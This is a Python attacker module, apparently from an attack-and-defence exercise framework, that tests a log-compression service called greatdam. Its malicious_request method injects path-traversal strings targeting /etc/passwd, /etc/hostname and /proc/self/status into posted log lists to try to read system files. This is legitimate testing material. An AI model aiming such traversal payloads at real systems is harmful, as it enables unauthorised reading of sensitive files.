import random

from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult
import asyncio
import aiohttp
import base64
import requests

attack_paths = [
    "./../etc/passwd",
    "./../etc/hostname",
    "./../proc/self/status",
    "./../sys/bus/cpu/devices/cpu0/power/control"
]

class GreatDamAttacker(Attacker):

    async def post_logs(self, logs):
        timeout = aiohttp.ClientTimeout(total=5)  # whole exchange, including reading the body
        async with aiohttp.ClientSession(timeout=timeout, auto_decompress=False) as session:
            async with session.post(f"http://{self.host}:{self.port}/logs", json=logs) as r:
                return await r.read()
        return None

    def benign_request(self, id: int, tick: int, sequence_no: int):
        try:
            response = requests.get(f"http://{self.host}:{self.port}/ping")
            if response.status_code != 200:
                return AttackResult.RESULT_DOWN
        except:
            return AttackResult.RESULT_DOWN
        try:
            with open(f'services/greatdam/attacker/log_requests/{tick % 10 + 1}') as f:
                content = f.readlines()
                request = [r[:-1] for r in content[:-1]]
                gzip_b64 = content[-1]
            gzip_response = asyncio.run(self.post_logs(request))
            b64_response = base64.b64encode(gzip_response).decode("ascii")
            if b64_response == gzip_b64:
                return AttackResult.RESULT_SUCCESS
            return AttackResult.RESULT_FAILURE
        except aiohttp.ClientResponseError as e:
            if 400 <= e.status:
                return AttackResult.RESULT_DOWN

        return AttackResult.RESULT_FAILURE

    def malicious_request(self, id: int, tick: int, sequence_no: int):
        try:
            response = requests.get(f"http://{self.host}:{self.port}/ping")
            if response.status_code != 200:
                return AttackResult.RESULT_DOWN
        except:
            return AttackResult.RESULT_DOWN
        try:
            with open(f'services/greatdam/attacker/log_requests/{tick % 10 + 1}') as f:
                content = f.readlines()
                request = [r[:-1] for r in content[:-1]]
                gzip_b64 = content[-1]

            for i in range(4):
                attack_request = request.copy()
                attack_request.insert(random.randint(0, len(request)), attack_paths[i])
                gzip_response = asyncio.run(self.post_logs(attack_request))
                b64_response = base64.b64encode(gzip_response).decode("ascii")
                if b64_response != gzip_b64:
                    return AttackResult.RESULT_SUCCESS
            return AttackResult.RESULT_FAILURE
        except aiohttp.ClientResponseError as e:
            if 400 <= e.status:
                return AttackResult.RESULT_DOWN

        return AttackResult.RESULT_SUCCESS

